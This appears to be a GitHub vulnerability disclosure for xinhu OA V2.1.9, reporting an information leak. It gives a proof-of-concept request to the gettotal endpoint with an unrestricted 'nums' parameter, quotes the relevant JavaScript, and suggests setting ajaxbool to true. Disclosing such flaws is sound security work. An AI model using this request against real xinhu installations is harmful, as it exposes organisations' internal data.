# xinhu-oa
xinhu oa Information leakage
xinhu V2.1.9
After the user logged in, open the following  page
poc：
/index.php?a=gettotal&m=index&d=home&atype=&loadci=&optdt=&nums=gong,kqdk,apply,officic,syslog,about&ajaxbool=true

Display the information in the picture
![image] (https://github.com/xuechengen/xinhu-oa/blob/main/%E6%98%BE%E7%A4%BA.JPG)

Check the source code and find that nums is not restricted，/webmain/home/index/indexAction.php


<script>
$(document).ready(function(){
	var optdt = '',loadci=0, taskarr={}, miao=200,reimtitle='REIM';
	var c= {
		itot:function(rlx){
			clearTimeout(this.tims);
			var nums = '',i;
			for(i=0;i<homenums.length;i++){
				nums+=','+homenums[i]+'';
			}
			if(!rlx)rlx='';
			var url  = js.getajaxurl('gettotal','index','home', {atype:rlx,loadci:loadci,optdt:optdt,nums:nums.substr(1)});
			$('#refresh_text').html(this.bd2('5Yi35paw57uf6K6h5LitLi4u'));
			js.ajaxbool =false;
			js.ajax(url,{},function(da){
				c.itots(da);
			},'get,json');
			homeobject.refresh=function(){c.refresh();};
		},
		init:function(){
			this.itot();
			var i,nust;
			for(i=0;i<homenums.length;i++){
				nust = homenums[i];
				if(homeobject[''+nust+'_init'])homeobject[''+nust+'_init']();
			}
  
 Change ajaxbool = false to ajaxbool = true
